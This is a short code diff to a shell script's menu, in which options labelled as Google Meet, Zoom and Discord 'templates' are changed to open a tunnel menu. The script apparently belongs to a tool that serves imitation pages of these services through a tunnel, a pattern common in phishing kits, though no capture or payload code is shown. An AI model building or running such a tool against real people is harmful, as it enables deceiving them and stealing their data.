@@ -719,15 +719,15 @@ main_menu() {
 		1 | 01)
       		printf "\n\e[1;92m[+] Starting Google Meet Template...\e[0m\n"
       		# start_google_meet
-      		;;
+      		tunnel_menu;;
     	2 | 02)
       		printf "\n\e[1;92m[+] Starting Zoom Template...\e[0m\n"
       		# start_zoom
-			;;
+			tunnel_menu;;
     	3 | 03)
       		printf "\n\e[1;92m[+] Starting Discord Template...\e[0m\n"
 	  		# start_discord
-			;;
+			tunnel_menu;;
 		99)
 			about;;
 		0 | 00 )
